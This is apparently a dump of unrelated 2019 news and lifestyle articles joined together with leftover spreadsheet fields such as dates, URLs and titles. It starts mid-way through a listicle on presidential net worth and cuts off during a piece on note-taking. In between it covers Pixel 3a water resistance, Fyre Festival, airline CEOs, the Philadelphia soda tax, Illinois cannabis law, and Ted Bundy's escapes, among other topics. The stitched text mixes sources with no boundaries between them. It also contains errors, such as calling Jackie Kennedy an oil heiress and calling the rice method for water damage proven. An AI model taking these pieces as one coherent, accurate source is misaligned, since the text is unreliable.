Theodore “Teddy” Roosevelt was born into a prominent, rich family in 1858 New York City, says The White House. Roosevelt was gifted a big trust fund but lost most of his money on a ranching venture in the Dakotas, says MSN. He worked as an author to pay the bills. Lucky for him, he could make money writing unlike most authors… Most of his career was spent in public service jobs besides the presidency. Like other presidents, he had an estate of his own — a 235 acre one called “Sagamore Hill” in Long Island.

NEXT: He was one of our wealthiest presidents, but found himself in debt towards the end of his life.



4. Thomas Jefferson Net worth: $236.8 million

Term: 1801-1809

President #3

Sure, the American Revolution seemed like a scrappy operation compared to the United Kingdom’s redcoats trying to hang onto their colonies. But that doesn’t mean our founding fathers were scrappy by any means. Au contraire, they were ballin.’ Mr. Jefferson here is just one example. His 5,000-acre Virginia plantation, Monticello, was tended to by dozens of slaves. A lot of Jefferson’s property was given to him by his father, says MSN, but he made some of his own money working in politics before becoming president. Despite his wealthy life, he found himself in debt when he died.

NEXT: He was rumored to have had wooden teeth.



3. George Washington Net worth: $587 million

Term: 1789-1797

President #1

He’s probably one of the most well known men in the entire history of the United States. Washington was the first president of our nation and one of our wealthiest. This is partially due to him being America’s most well paid president (his salary was two percent of the budget in 1789, says MSN). Washington’s family came from money — his wife, Martha, inherited tons of property from her father. The pair lived on a baller plantation (Mount Vernon — ever heard of it?) that had FIVE separate farms on 8,000 acres. Like most founding fathers, he had slaves — 300 of them.

NEXT: A 2013 Gallup poll revealed this president as America’s favorite.



2. John Fitzgerald Kennedy Net worth: $1.1 billion

Term: 1961-1963

President #35

No name is more famous in American politics than “Kennedy.” The Kennedys are a powerful, elite family in American politics that have held many political positions. They’re both loved and despised. Needless to say, John Kennedy (often known as “JFK”) was born into great wealth because of his familial ties. Kennedy’s dad was the first chairman of the U.S. Securities and Exchange Commission (SEC). MSN says JFK’s money came from a shared trust with other family members. Kennedy’s wife, Jackie, was also born into wealth — she was an oil heiress.

NEXT: He’s the oldest — and richest — U.S. president in our nation’s history.

Is Google Pixel 3a / Pixel 3a XL Waterproof? [Water Damage Tips]

",20/06/2019 10:04,https://teamandroid.com/2019/05/16/google-pixel-3a-waterproof/,"Is Google Pixel 3a Waterproof?

Google announced the mid-range Pixel 3a and Pixel 3a XL phones last week. These new phones show Google changing the mid-range market for good with a much better camera and fast performance on a not-so-flagship hardware. These new Pixel phones had to make a cut between an amazing camera result and extra features like wireless charging, high-end processor and GPU. So, did waterproofing make the cut? Let’s take a look and see if the Google Pixel 3a is waterproof or not.

There are some features that we expect from every flagship phone, like fast wireless charging, multiple cameras at the back, top-of-the-line hardware etc. And water-proofing and resistance is one of those things that we expect phones to have.

Google Pixel Waterproof History

The very first Google Pixel did not have an IP rating, which means, no water and dust resistance. However, there are several videos online that proof the original Pixel to be tightly sealed and was fully capable of surviving an accidental dip in the water. Not just that, several YouTube creators even kept the original Pixel in a freezer for several hours to fully freeze the phone. And even then, the Pixel survived with no water or moisture damage.

Soon later, Google launched the Pixel 2 phones that came with a certified IP rating. Personally, I have used the Pixel 2 XL under water and never had any issues. I have even used it during rain to make calls, and it worked perfectly. Some users did report some speaker distortion after the phone was submerged in the water, but that was only temporarily and everything would get back to normal once the phone dried up.

And similarly, the Google Pixel 3 is also water and dust resistant. It has a water protection rating of IP68 under IEC standard 60529.

Google Pixel 3a Waterproof?

Coming back to the Google Pixel 3a, a number of ‘extra’ features of a high-end phone didn’t make it to this mid-range phone. So yes, the Pixel 3a and Pixel 3a XL phones are NOT water or dust resistant.

These phones may be tightly sealed and may even provide protection like the original Google Pixel, but they are not IP rated, officially. So why take the risk? We would highly recommend staying away from water and excessive dust.

Now that we know this phone does not have an IP rating, it is better to put on a waterproof case or keep your phone in a zip-lock bag when going to a beach. This way the bag will prevent any dust, sand or even water getting to your new Google Pixel 3a.

For daily use, we’d recommend using a case at all times.

How to Fix Water Damage?

This is a bit tricky. If your Pixel 3a took a dip in water, first thing, relax. Turn off your phone and wait. Wait for several hours before you even try to switch it back on. And most importantly, do not try to charge your phone if there is any moisture or water in the USB-C slot. That could fry up your USB-C for good.

The rice method is what you should try first. It is a popular method for electronic devices when they get water damaged or have moisture in them. You take a bowl of rice and place your phone in it while it is powered off. Now you keep your phone in the bowl for a day or two. Rice absorbs all the moisture so this trick has been proven and had worked for many people with their phones and other electronics.

Power on your phone. If you see any signs of distorted display screen, delayed touch feedback or if any of the buttons or slots seem to not work, that means you will have to send in your phone for repair. For the Pixel 3a, it will be better to look for an official service center or partner services for repair. This may cost you a lot depending on the extent of damages to your phone.

Pixel 3a Water-Proof Cases

Waterproof cases for the Google Pixel 3a are not yet available by any maker. We’ll update this page with more details when they are available for purchase.

The mastermind of the royal calamity that was Fyre Festival, Billy McFarland, is planning to write a ""tell all"" memoir about the ill-fated event while serving prison time for fraud.

In an exclusive interview with the

, acclaimed freelance editor Josh Raab said he was approached by McFarland's girlfriend who said he was writing a book titled

Promythus: The God of Fyre

.

Anastasia Ermenko is a Russian model who started dating McFarland after Fyre Festival. In an email to Raab, she said:

Last month 2 documentaries came out about the FYRE FESTIVAL but unfortunately both misrepresented the real events and Billy would like to share his story.

Fyre Festival was a luxury music festival founded by McFarland and rapper Ja Rule. The event failed - hundreds of attendees who paid thousands for tickets showed up to a remote island in the Bahamas where there wasn't enough shelter, food and security.

McFarland is serving a six-year sentence for fraud related to Fyre Festival and for selling fake tickets to high profile events like the Met Gala while he was out on bail. His girlfriend may be one of his last remaining allies.

Raab spoke to both McFarland and Ermenko about the book - which was going to be 800 handwritten pages by McFarland from prison detailing the ""raw"" story of Fyre that he feels Hulu and Netflix missed in their documentaries.

In the exchanges, McFarland hinted that there would be more festivals.

McFarland explained that he wanted to publish soon because the story would be invalid after the ""next events take place"". He said in an email:

Putting in terms of Wolf of Wall Street, the Festival will not be a one and done event — it's happening again, so the original story will lose the potential to be told and set the stage if it's not done before the next events take place.

Raab declined to write the book, but McFarland and Ermenko neglected to make him sign a non-disclosure agreement. So now, we are hearing all about it.

McFarland planned to publish on Amazon in April, but it's May and we're still to hear anything about

Promythus: The God of Fyre.

McFarland owes $26 million in restitution to investors and says he would use proceeds of the book to cover these costs, while giving money back to the Bahamian people whose livelihoods suffered from the failed Fyre Festival.

The CEO of United Airlines Says He Can't Really Make Passengers
Happy. The CEO of Delta Has a Brutal Response

Absurdly Driven looks at the world of business with a skeptical eye and a firmly rooted tongue in cheek.

I've been thinking a lot about happiness lately.

With respect to companies and their brands, you understand.

Recently, I wrote about a survey that suggested airlines lag far behind other categories in the happiness and love departments -- though Southwest came out best.

Many regular fliers might see why, although not all of this is the airlines' fault.

Still, in a recent interview with ABC News, United Airlines CEO Oscar Munoz intimated that there's really nothing his airline can do to make passengers happy.

He said:

""It's become so stressful from when you leave, wherever you live, to get into traffic, to find a parking spot, to get through security. Frankly, by the time you sit on one of our aircraft... you're just pissed at the world.""

Well, not always.

I've actually had pleasant experiences on United, some of them even within the past year.

Yet Munoz added that no cookie or smile could make passengers feel better.

Oddly, his belief seems to be shared by other members of his management team.

It was moving, then, when Munoz's views were put to Delta CEO Ed Bastian by Marketplace.

His response was, well, quite direct:

""I disagree. Those certainly aren't Delta customers he's speaking to.""

Could it be that Delta customers somehow don't feel stressed by finding a parking spot and going through security?

Could it be they arrive at their seats only too delighted to be flying Delta?

In my most recent experience with Delta, I was indeed delighted to get on the plane, but only because the airline uses Terminal 1 at San Francisco Airport.

This is a building designed by those with a pungent distaste for their fellow humans. (It's now being redeveloped.)

Still, Bastian insisted his customers tell surveys they're more and more pleased with the airline:

""This industry is about more than just airplanes and technology. It's about people. And we have wonderful people that provide great service.""

There's a wider issue here.

Munoz may be right that the rigors of travel, the tiresome nature of security procedures and, frankly, the minimal space airlines give passengers -- especially in Economy Class -- don't encourage those passengers to delight in flying.

This doesn't mean, however, that a business can't still motivate its staff to provide something if not exceptional, then certainly better than mundane or even defeatist.

Sheer thoughtfulness -- which, yes, might include a cookie, a smile, a shared joke, or a proactive helping hand -- can make the difference between a pleasant customer experience and a dreadful one.

For example, last week I flew TAP Air Portugal, and everything from the kind attitude of its flight attendants to the simple, thoughtful presentation of (free) food in Economy Class made the whole experience far better than it should have been, given that we were on a relatively cramped Airbus A321neo and flying into Heathrow Airport.

Munoz's words might have expressed his own exasperation with things (he believes) his airline simply can't control.

But you have to look at your customers' realities and decide to commit time, thought and, yes, even money to make them want to come back to you.

If you're in a service business -- and there are those who believe airlines are only in the business of getting you from one place to another -- dedicating yourself to service on a daily basis is very hard.

I actually think United is trying to do that.",The CEO of United Airlines Says He Can't Really Make Passengers Happy. The CEO of Delta Has a Brutal Response,

A concerned mum was filled with fear when she noticed a huge black mark on her the top of her daughter's mouth.

Darian Depreta was playing with her gorgeous little girl Bella when she spotted the massive circular mark.

She tried to wipe it off but started to panic when it didn't disappear.

She said: ""So I'm playing with Bella today and notice the roof of her mouth is black.

When they got to the GP, the nurse also unsuccessfully tried to wipe it off, then said she had never seen anything like it.

Doctors then suggested it could be a birth mark but Darian, who lives in the US, insisted it wasn't as she checks her mouth regularly to clean it.

Darian said: ""I'm now being told that my daughter will be set up with 2 specialists. After insisting it wasn’t a birthmark on the roof of her mouth, the NP decided to take another look at this medical mystery.

While Darian is embarrassed about the situation, she appreciates it could have been much worse.

Posting on Facebook, she writes: ""Yes she could have choked on it and I’m thanking God she did not.

Her father, Robert Kardashian, was an attorney who gained notoriety serving on O.J. Simpson's defense team, but Kardashian West's own interest in the law grew from her work with CNN commentator and criminal justice reform advocate Van Jones on his efforts to ""shrink the incarceration industry."" Kardashian West made a much-publicized visit to the Oval Office to advocate for Alice Marie Johnson, a 63-year-old great-grandmother who was sentenced to life in prison for a nonviolent drug offense. After her meeting with President Donald Trump, Johnson was granted clemency. ""I just felt like I wanted to be able to fight for people who have paid their dues to society,"" Kardashian West tells Vogue. ""I just felt like the system could be so different, and I wanted to fight to fix it, and if I knew more, I could do more."" Kardashian West, who does not have an undergraduate degree, knew the unlikely choice ""would be met with an eye roll for the ages."" But even more surprising to some is the fact that the entrepreneur and social media influencer won't need to attend law school before she takes the bar exam, which she plans to do in 2022. According to The Washington Post, California does not require a law degree as a prerequisite for taking the bar exam. Neither do Vermont, Virginia or Washington.

Instead, these states allow people to become ""law readers"" by apprenticing with a practicing lawyer for a designated amount of time each week. Programs vary from state to state. Kardashian West is participating in the California Law Office or Judge's Chamber Program, which requires applicants to complete a form giving ""Notice of Intent to Study in a Law Office or Judge's Chambers"" and pay an initial fee of $158, as well as additional paperwork and $105 fees to be submitted every six months throughout the program. After one year as an apprentice, applicants qualify to take the First-Year Law Students' Examination, sometimes known as the ""baby bar."" If they pass this exam, legal hopefuls are permitted to continue studying for three more years. The program requires a total of four years as an apprentice at a law office or in a judge's chamber. Kardashian West says she has been completing 18 hours of weekly supervised study since July, under the supervision of two mentor lawyers, Jessica Jackson and Erin Haney of #cut50, an Oakland-based prison reform organization co-founded by Jackson and Van Jones.

BACKFIRE: Philadelphia Implemented Soda Tax, But It Didn't Go
As Planned

",23/05/2019 14:17,https://www.dailywire.com/news/philadelphia-implements-soda-tax-it-doesnt-go-amanda-prestigiacomo,"The citizens of Philadelphia have been rocked by a tax on sugary drinks like soda, although the hike was intended to improve their health.

As outlined by Hotair on Saturday, the “soda tax” has actually led to Philadelphia residents traveling outside the city to buy their soda (and likely other goods), decreased the city’s revenue, and led to layoffs in the local beverage industry and cut hours for employees at small markets. It did not, however, lead to an increase in healthier beverage purchases in the city.

When the soda tax was first announced, workers at Pepsi took a hit. “With sales slumping because of the new Philadelphia sweetened beverage tax, Pepsi said Wednesday that it will lay off 80 to 100 workers at three distribution plants that serve the city,” philly.com reported in March of 2017.

And last month, the local outlet reported that the owner of Acme Markets, who has 16 stores in Philadelphia, had to cut employees’ hours because of the tax: “The beverage tax fell on about 4,000 items. In Acme city stores, soda sales dropped as much as 80 percent. Sales of other items covered by the tax, such as juices, creamers and energy drinks, were down 30 percent, and the number of customers declined by 5 percent. Philly stores cut an average of 150 to 200 employee hours per week, resulting in lighter paychecks for employees.”

But the hit the employees took did not equate to a win for the “health” of its citizens. As noted by Hotair, Philadelphia residents were traveling outside the city to avoid the tax hike on their drinks.

A CNN report on a study from medical journal JAMA focused in on the 51% drop in city soda purchases, but admitted: “While researchers found that sales of sugary beverages fell in Philadelphia after the tax, beverage sales in nearby towns and counties without the tax went up. That suggests people may have been traveling to get their soda at a reduced price.”

“People stopped buying their soda in the city (and almost undoubtedly a lot of other shopping list items) and decided to shop where prices were lower,” Hotair noted.

So was there at least an uptick in healthier beverage purchases because of the tax? Nope. “Philadelphia did not see an increase in sales of untaxed beverages such as bottled water,” CNN reported.

CNN did not discuss the revenue hit Philadelphia took, but Hotair did: “The tax on soda increased by 17%, but the sales fell by 51%. So, let’s look at this assuming one million ounces of soda was sold annually before the tax went into effect. If sales had remained the same, the city would have realized $62,400.00 in revenue instead of $54,300.00. But with the volume cut in half, they managed to slash their revenue to $31,200.00.”","BACKFIRE: Philadelphia Implemented Soda Tax, But It Didn’t Go As Planned",

I am that person who hates drinking water. Where others enjoy a satisfying thirst quencher, I suffer through a barrage of sulfur, algae, swimming pool, and old metal pipes. Most days I avoid the issue entirely, subsisting on coffee, herbal tea, and the occasional LaCroix. But a few months ago, I began to suspect that chronic dehydration was the reason I continually felt tired and achy. So, in an effort to overcompensate my way to better life habits, I decided to slosh through a feat known across the internet as the Water Gallon Challenge: drinking a gallon per day for a month, with the promise of glowing skin and a lot more energy. Given my taste sensitivities, I went the filtered route and brought with me a hoard of limes, cucumbers, and sea salt, plus an emergency stash of electrolyte mix and a journal to track my energy, yoga performance, and bathroom breaks. Here’s how it went.

Day 1: I’m peeing every 15 minutes. How in the hell am I supposed to get anything done?

Day 2: I did not think it was physically possible to pee more than I did yesterday (21 times), yet here we are, 23 times. Additional instances of bodily rebellion include an afternoon of mild nausea and a slight headache.

Day 4: I didn’t feel like a 70-year-old woman when I got out of bed this morning. I deep-cleaned my house with the stamina of an old-school Disney princess. Is water the magical cure for the generalized fatigue my doctor insists is not a real thing?

Day 5: Yes! Water is life! I no longer hobble into my day with my feet and spine curled up like dry leaves. I thought this experiment would be miserable, but I totally get it now. (Though to be clear, water—even filtered water—still tastes disgusting without flavor enhancements.)

Day 7: Can we talk about how good I am at yoga right now? My hamstrings are much more flexible, and my back bends with ease. Even better, I have energy afterward, and I’m not horribly sore the next day.

Day 10: A switch to water that’s been ultrapurified by reverse osmosis (plus “carbon polishing” and UV sterilization) has proved revelatory. It’s fully palatable and delicately sweet, without a hint of chlorine. I’m now the proud owner of a refillable three-gallon jug.

Day 14: I crave water first thing in the morning instead of coffee. I don’t recognize myself anymore.

Day 19: The peeing has decreased to ten times per day. I’m still acutely aware of how much water I’m flushing down the toilet, so I’ve donated $30 to Charity: Water, which funds clean-water projects in 26 countries.

Day 24: My massage therapist confirms that my muscles and fascia are noticeably looser. She’s shocked to learn that before this, in the two-plus years she’s been trying to fix my body, I had been drinking barely any water.

Day 32: Oops, the month is over and I didn’t even notice—hydration is routine, and I’m loving it. Am I going to keep guzzling 128 ounces every day? Not unless I’m sweating buckets. But you better believe I’ll keep sipping on glorious, ultrapurified water like my well-being depends on it.

Fluid Dynamics

Nicole Lund, a nutritionist at New York University’s Langone Sports Performance Center, explains the basics of hydration.

How much: “Proper hydration means 85 ounces of water a day from food and beverages, plus more to replenish what you lose when exercising.” (That’s roughly four ounces of water for every quarter-pound of weight lost during your workout.)

Energy and performance: “Physiological changes occur even in the early stages of dehydration, including decreased blood volume and less oxygen delivered to working tissues. These changes make it harder to sweat, which will increase body temperature and heart rate and make you feel more fatigued during exercise.”

Bathroom breaks: Frequent trips to the restroom are normal with increased water intake, Lund says. “As with anything else that you change drastically, your body needs time to adjust if you start drinking a lot more.”

The bottom line: “We all wake up slightly dehydrated. The easiest change you can make is to have a big glass of water first thing in the morning.”",What Happens When You Drink a Gallon of Water a Day?,

The 11th State to Legalize Recreational Pot Will Be... -- The

Once considered a taboo topic that lawmakers regularly swept under the rug, cannabis has now become a mainstream topic in the United States, as evidenced by the fact that 2 out of 3 Americans support broad-based legalization, according to Gallup.

Cannabis favorability has also been the driving force of legalizations at the state level. In 24 years, we've gone from having zero approved medical or recreational weed states to 33 states with medical pot laws on their books. Of these 33 states, 10 allow for adults to consume cannabis, with nine having OK'd the retail sale of pot (sorry, Vermonters).

With pot revenue picking up at the state level, and polling clearly favoring legalization, it looks to be only a matter of time before new states take the plunge from the medical or recreational side of the equation. But, to be clear, recreational sales are expected to bring in the lion's share of legal marijuana revenue in the United States.

The 11th state to legalize recreational weed will be...

So, which state looks to have an inside track on becoming the 11th to legalize adult-use marijuana? Had you asked a few months ago, it looked to be a neck-and-neck battle between New Jersey and New York. Unfortunately, efforts to legalize marijuana in both states fell apart, and neither looks to be in a position to pass legislation anytime soon. Instead, the Land of Lincoln appears to be in the pole position to become the 11th recreationally legalized state.

As reported by Time and the Chicago Tribune last weekend, Illinois Governor J.B. Pritzker, a Democrat, announced that he had reached an agreement with key lawmakers in the state's legislature to legalize recreational marijuana by Jan. 1, 2020. The bill would allow residents of Illinois to possess up to 30 grams of cannabis (a little more than one ounce), with out-of-staters allowed to possess up to 15 grams. Illinois residents would also be allowed to grow up to five plants. And, as with all other legal states, the age limit for purchases would be set at 21 and older.

In addition to simply legalizing adult-use weed, the bill announced by Pritzker would expunge certain cannabis convictions (e.g., misdemeanors and Class 4 felonies), and include a $20 million low-interest loan program. This loan program would aid applicants in opening a licensed cannabis business who have lived in communities with high crime rates, or in communities with a high rate of incarceration or arrest for marijuana offenses.

Then, there are the highly lucrative taxes on recreational pot. Cultivators and processors would pay 7% of their gross sales to dispensaries, with consumers paying at least a 10% tax rate on recreational cannabis products. Products with less than 35% tetrahydrocannabinol (THC) content -- the cannabinoid that gets a user high -- will bear a 10% tax rate, with products over 35% THC content (e.g., concentrates) featuring a 25% tax rate. Cannabis-infused beverages will sport a 20% tax rate. And, just for good measure, municipalities and counties can add on their own separate tax rates, which peak at 3% for municipalities, and up to 3.5% for unincorporated counties. At least 10% of the revenue generated from legalizing recreational pot would help Illinois cover unpaid bills.

According to the governor's office, even though legalization would take hold on Jan. 1, 2020, recreational licenses for dispensaries wouldn't be issued until May or June 2020.

These pot stocks are champing at the bit for Illinois to legalize recreational marijuana

As we saw from the Garden State and Empire State, even so-called sure things can fall apart. While the pathway to legalization looks clear now, the bill will undoubtedly face opposition. But should Illinois become the 11th state to OK adult-use marijuana, there would be quite a few happy campers in the cannabis industry.

For starters, MedMen Enterprises ( MMNFF 3.94% ) would be doing the happy dance. Although the upscale, vertically integrated dispensary operator has but one open location in Oak Park, it would make MedMen's $682 million all-stock deal to buy privately held PharmaCann look all the sweeter. You see, PharmaCann was initially awarded six medical marijuana licenses in Illinois, which was tops in the state at the time of the award. It has four open dispensaries that serve about 80% of the Chicagoland market, and it has two relatively local production facilities. With the infrastructure already in place, MedMen would simply need to apply for a recreational license, or amend its existing medical pot licenses, to get a piece of what could be a multibillion-dollar market.

Recreational weed legalization in the Land of Lincoln would also be a feather in the cap for Canopy Growth ( CGC -5.00% ), which announced the contingent acquisition of Acreage Holdings ( ACRGF ) for $3.4 billion last month. If the U.S. federal government legalizes marijuana, within a 90-month time frame Canopy will have the right to acquire Acreage, which currently has cultivation, processing, or retail operations in 20 states -- best among vertically integrated dispensary operators. Among those 20 states is Illinois, where Acreage has a cultivation farm and two dispensaries. In other words, it would further entrench Canopy Growth in one of America's key markets.

The largest vertically integrated dispensary by license count (assuming all pending acquisitions close), Harvest Health & Recreation ( HRVSF ), also stands to benefit. In March, Harvest Health announced that it'd be acquiring privately held Verano Holdings for $850 million in an all-stock deal. Verano currently has two Zen Leaf dispensaries located in Illinois (one in Chicago and the other in St. Charles). While Harvest Health will have 130 retail store licenses in 17 states (again, assuming all acquisitions close), you can count on Illinois becoming a reasonably important part of its long-term strategy.

Now, we simply watch and wait to see if Illinois lawmakers can deliver the green as the governor has promised.",The 11th State to Legalize Recreational Pot Will Be...,

Florida Man Arrested For Refusing To Remove His Very NSFW
Bumper Sticker

",15/05/2019 20:08,https://www.fox13news.com/news/florida-man-arrested-for-refusing-to-remove-vulgar-bumper-sticker-theyre-just-words,"article

A Florida man who was jailed after refusing to remove what authorities called an obscene sticker from his vehicle's window said Tuesday that he is fighting the charges and will defend his constitutional right to free speech.

Dillon Shane Webb, 23, was arrested Sunday and charged with misdemeanor counts of violating Florida's obscenity law and resisting an officer without violence, a Columbia County Sheriff's Office report said.

Webb told The Associated Press in a telephone interview that he plans to file a wrongful arrest lawsuit against the sheriff's office.

""I'm tired of police forces thinking they are above the Constitution, the Bill of Rights,"" Webb said.

A deputy stopped Webb in Lake City because of a vehicle sticker crudely describing a sexual appetite, the sheriff's report said. When told about the reason for the stop, Webb reportedly said, ""They're just words.""

Wedd said the deputy seemed angry from the start of the traffic stop.

""Like the whole time, he was just really rude,"" Webb told the AP. ""It just felt to me like his goal was to get me in jail.""

The deputy said he asked Webb how a parent of a small child would explain the meaning of the words, and Webb said that ""it would be up to the parent.""

Webb told the AP that he didn't imagine the sticker doing any serious damage to children.

""I've had parents drive by me with their kids taking pictures,"" Web said. ""They point and laugh and giggle, and they go on about their day.""

Webb said he had the sticker on his truck for less than a week before his traffic stop. He said he and several friends had all decided to get similar stickers as a group joke.

""I guess this cop just didn't find it funny, and he just thought he has to put me in jail,"" Webb said.

The deputy initially cited Webb for obscenity with a notice to appear in court, the report said. The deputy told Webb to alter the sticker to change the derogatory part, but Webb refused.

""I said I'm not removing any letters on my sticker because that's in violation of my First Amendment rights as a tax-paying citizen,"" Webb said.

The deputy then charged Webb with resisting and took him to jail. Webb was released several hours later on $2,500 bond.

Webb's vehicle had been towed when he was arrested. He said the sticker was still in place when he retrieved the vehicle.

The American Civil Liberties Union of Florida released a statement Tuesday questioning why the sheriff's office was wasting resources on such a traffic stop.

""Shouldn't police officers spend their time serving and protecting communities and not pulling Floridians over for speech that is already protected by the First Amendment?"" ACLU spokeswoman Casey Bruce-White said in a statement. ""Using the excuse that a child would see and ask questions about this particular bumper sticker is absurd.""

The sheriff's office told the AP that deputy had probable cause of a violation of criminal law and took action. ""If the law is faulty then the legislature can address that or if the law is unconstitutional then the judiciary will address it, Sgt. Murray Smith said, adding that the defendant will have his day in court.

Webb said he wasn't even aware of the state's obscenity law, but after reviewing it since his arrest, he said it needs to be changed. He acknowledged that his sticker could be considered vulgar by some, but the law doesn't really define what that is.

""What's vulgar to me might not be vulgar to somebody else,"" Webb said.

LA Writer Wore A MAGA Hat Into An Ultra-Liberal Vegan
Restaurant. Here’s What Happened.
",15/05/2019 13:52,https://www.dailywire.com/news/la-writer-brought-maga-hat-vegan-restaurant-heres-paul-bois,"As a case study in American political tribalism in the age of President Trump, a Los Angeles writer wore a MAGA hat to an ultra-liberal vegan restaurant in the city to see what sort of adventures would unfold. Quite shockingly, people actually proved his thesis wrong.

The article by Joel Stein in Los Angeles Magazine confronts the fact that Americans hate each other in the age of President Trump, a fever he himself admits to having been inflicted with at times.

“More than 42 percent of people in each party think those in the other party are ‘downright evil,’ 20 percent of Democrats and 16 percent of Republicans think we’d be better off if members of the other party ‘just died,'” Stein writes. “The anger is so ubiquitous that even I’ve been infected. I saw an elderly man walking toward me on the Ferndell Trail in Griffith Park wearing a red hat, and I hate-stared him until he got close enough that I could see it had a USC logo on it. I avoided talking to a nice dad at my son’s old school because there was a rumor that he voted for Trump.”

Stein has been researching political tribalism for his upcoming book, oddly titled “In Defense of Elitism.” He admits that his research has led him to see some Trump supporters in a different light, such as when he visited Miami, Texas, only to find out that the people there were so nice that they “fed me in their homes or paid the server before our check arrived.”

“I worry that my side isn’t as friendly,” Stein admits. “We’ve harassed politicians out of restaurants, chanted threats outside a Fox News anchor’s home, and gone off on me for asking other parents if putting on a play about Native Americans despite the fact that there are no Native Americans in our school is really that evil.”

In light of all this, Stein devised a little social experiment: wear the iconic Make America Great Again hat to the ultra-liberal Café Gratitude in Larchmont, which he describes as a “vegan hipster restaurant.” It’s a restaurant so liberal that when the establishment sold a “Make America Grateful Hat,” customers complained that it took President Trump’s evil too lightly.

“I didn’t want to give $25 to Trump’s re-election campaign, so I bought a knockoff hat made in China for $8 on Amazon,” Stein writes. “The hate is so strong in me that I thought it was more ethical to support the Chinese government than Trump.”

Stein admits to being terrified upon his journey to the restaurant, fearing the absolute worst could happen, recalling the incident at Dodger Stadium where a guy ended up in a nine-month coma for wearing a San Francisco Giants hat. When he arrived at Café Gratitude, however, his expectations were surprisingly disproven. In fact, Stein learned some interesting insight about people on his own side — they don’t hate Trump or his supporters nearly as much as they profess.

“I glanced around the room, and no one gave me a dirty look,” Stein writes. “No one walked up to yell at me about Charlottesville or caged children. The guy with the ear twig pulled out a newspaper called the SJW, which I figured was a publication for Social Justice Warriors until I looked again and saw it was The Wall Street Journal.”

“Before I left, I asked the black waiter, Darick Thomas, how he felt about my hat,” Stein continues. “‘I don’t care. At all. Really. At all! I look at a hat and that doesn’t tell me who the person is,’ he said. “‘I’m not against Trump. He says some smart things; he says some dumb things.'”

Throughout Stein’s whole time at the restaurant, only one person, a patron, openly expressed disapproval of his MAGA hat. “Is that guy wearing a f***ing MAGA hat?” the patron asked at the counter.

Stein’s article ends on a quasi-confused note, illustrating how his experience throughout his research has stifled his narrative, so much so that he strives to keep his beliefs about Trump intact. He recalls a moment when his friend saw a man with a swastika tattoo on his neck frolicking through the park in some kind of Instagram photo shoot, expressing frustration that nobody confronted him.

“The far right has become so normalized that no one said anything to a guy in a MAGA hat at Café Gratitude,” Stein concludes. “I Am Not Sure How Great That Is.”",LA Writer Wore A MAGA Hat Into An Ultra-Liberal Vegan Restaurant. Here’s What Happened.,

You Won't Believe How Many Times Ted Bundy Actually Escaped
From Prison

",7/05/2019 8:41,https://www.yahoo.com/lifestyle/wont-believe-many-times-ted-135800381.html,"You Won't Believe How Many Times Ted Bundy Actually Escaped From Prison

From Women's Health

Ted Bundy, the infamous serial killer who murdered at least 30 women, escaped from custody twice before his final arrest.

His first escape came when he jumped out of second story law library window, and his second happened when he lost enough weight to squeeze through a hole in his cell ceiling.

Bundy's story has been brought into the spotlight again with the release of Netflix's biopic, Extremely Wicked, Shockingly Evil and Vile.

Ted Bundy, the notorious serial killer and rapist-who is back in the spotlight thanks to the recent Ted Bundy Tapes documentary and upcoming Netflix biopic, Extremely Wicked, Shockingly Evil and Vile-actually escaped prison twice before being executed under the death penalty.

It begs the question: How did such a notorious serial killer escape from prison so much?

Bundy's first escape happened while he was in jail in Aspen, Colorado to stand trial for the murder of Caryn Campbell, a 23-year-old nurse who was found dead in Snowmass, Colorado in 1975.

Since Bundy was assisting in his own defense (he actually attended law school for a short time), he was allowed to use the law library on the second floor of the courthouse where the prison was located, according to ABC News. He also wasn't required to wear shackles or handcuffs while walking into or around the library, and he noticed how easy it would be escape, according to recordings between him and his prison psychologist, Dr. Al Carlisle.

So, on June 7, 1977, Bundy took his chance while he was locked in the library and the prison guard left for a smoke. Bundy jumped out the window and sprinted for the mountains.

“The windows are open, and the fresh air is blowing through. And the sky was blue, and I said, 'I'm ready to go,' and walked to the window and jumped out,"" Bundy told Carlisle, per ABC News. ""Honest to god, I just got sick and tired of being locked up.""

It took about ten minutes for anyone to realize Bundy had escaped. Once the guards saw he was gone, city police were notified, roadblocks were placed at both ends of Aspen, and all cars that were leaving the city were checked. But by then, Bundy was long gone in the mountains, where he found and broke into a cabin to stay for a few days.

Story continues

Eventually, he headed back into Aspen, where he stole a car that was later pulled over for reckless driving. He was free for a total of six days before being placed back in prison.

His second escape, on December 30, 1977, was much more complex. After being moved to a prison in Glenwood Springs, Colorado, Bundy started to lose weight-on purpose. He carved around an opening that already existed in the ceiling of his cell (meant for a light fixture that wasn’t installed), and was able to climb through to the ventilation ducts. He even left books under his blanket to make it appear he was still in the cell, sleeping.

According to Bundy's attorney at the time, he dropped down from the ducts into one of the guards apartments in the building, changed into the guard's clothes, and walked out of the prison.

After leaving jail, Bundy boarded a flight to Chicago, took a train to Ann Arbor, Michigan, drove south to Atlanta, and finally got on a bus to his final desination: Tallahassee, Florida, per ABC News.

It was then, when Bundy was added to the FBI's Ten Most Wanted Fugitives list and, unfortunately, when he killed his final known victims before being arrested for a final time on February 15, 1978 in Pensacola, Florida. That was the end of Bundy's escapes from prison-he was executed via electric chair on January 24, 1989.

This Is the Best Way to Take Notes, According to Science
",22/04/2019 17:31,https://nesslabs.com/note-taking,"While note-taking feels natural to students, this is something many people stop doing once they start working, either as an employee or for themselves. We may bookmark something to read it later, but the active process of taking notes when consuming content is not a common habit.



“It doesn’t matter how you record your notes, as long as you do.” Bill Gates.

While I may not 100% agree with Gates here—some note-taking systems do seem to work better than others—science shows that note-taking itself has many benefits. Let’s have a quick look at what these are.



Better learning. According to research, note-taking allows you to better remember the stuff you read. This is because the effort required to take notes helps form new pathways in the brain and encode the information in a way that stores it better in your long-term memory. This does not happen as effectively when passively taking information in.

This does not happen as effectively when passively taking information in. Quantity over quality. As with creativity, quantity is more important than quality when it comes to note-taking. Evidence shows that the more notes you take, the more information you tend to remember later. So don’t try to keep it short—be generous in the way you take notes.

So don’t try to keep it short—be generous in the way you take notes. Get visual. When taking notes, go beyond simple words. Research shows that, compared with writing alone, adding sketches to your notes has a great impact on learning. These drawings could represent concepts, relationships, or terms you want to remember better. This is called The Drawing Effect.

These drawings could represent concepts, relationships, or terms you want to remember better. This is called The Drawing Effect. Hand-written notes are better. If you can, try hand-written notes. Studies have found that taking notes by hand is better for learning and memory than taking notes on a computer.

Classic note-taking systems

Everyone has a slightly different way to take notes, but for those who don’t already have a framework, there are various tested and proven note-taking techniques you can try to make your notes more effective.



